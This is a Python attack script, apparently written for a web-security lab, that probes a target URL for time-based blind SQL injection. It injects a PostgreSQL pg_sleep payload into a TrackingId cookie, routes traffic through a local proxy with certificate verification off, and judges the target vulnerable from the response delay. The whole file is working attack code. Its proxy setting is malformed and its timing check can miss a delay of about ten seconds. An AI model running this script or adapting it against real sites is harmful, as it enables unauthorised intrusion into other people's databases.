import sys
import requests
import urllib3
import urllib


proxies={'http':'https:127.0.0.1:8080','https':'https://127.0.0.1:8080'}

def blind_sqli_check(url):
	sql_payload = "' || (SELECT pg_sleep(10))--"
	sql_payload_encoded = urllib.parse.quote(sql_payload)
	cookies={'TrackingId':'BxpLyTPbP7pH4YSA'+sql_payload_encoded, 'session':'QOwaowhmiWtjLQpbm1t7fUsx9UVuGVh8'}
	r = requests.get(url,cookies=cookies,verify=False,proxies=proxies)
	if int(r.elapsed.total_seconds()) >10:
		print("(+) vulnerable to blind-based SQL injection")
	else:
		print("(-) Not vulnerable to blind-based SQL injection")	


def main():
	if len(sys.argv) !=2:
		print("(+) Usage: %s <url>" %sys.argv[0])
		print("(+) Example: %s www.example.com" %sys.argv[0])
		sys.exit(-1)

	url = sys.argv[1]
	print("(+) checking if tracking cookies is vulnerable........")
	blind_sqli_check(url)

if __name__ == '__main__':
	main()